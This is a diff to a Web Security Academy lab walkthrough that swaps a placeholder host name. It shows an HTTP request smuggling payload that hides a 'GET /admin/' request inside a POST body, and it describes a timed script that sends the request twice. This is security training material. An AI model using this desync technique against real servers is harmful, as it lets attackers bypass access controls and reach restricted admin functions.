@@ -1070,14 +1070,14 @@ _Note: This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTT
 
 ```html
 POST /resources HTTP/1.1
-Host: YOUR-LAB-ID.web-security-academy.net
+Host: lab-id.web-security-academy.net
 Cookie: session=YOUR-SESSION-COOKIE
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: CORRECT
 
 GET /admin/ HTTP/1.1
-Host: YOUR-LAB-ID.web-security-academy.net
+Host: lab-id.web-security-academy.net
 ```
 
 7. In the Python editor panel, enter the following script. This issues the request twice, pausing for 61 seconds after the \r\n\r\n sequence at the end of the headers:
@@ -1113,7 +1113,7 @@ def handleResponse(req, interesting):
 
 ```
 POST /resources HTTP/1.1
-    Host: YOUR-LAB-ID.web-security-academy.net
+    Host: lab-id.web-security-academy.net
     Cookie: session=YOUR-SESSION-COOKIE
     Connection: keep-alive
     Content-Type: application/x-www-form-urlencoded
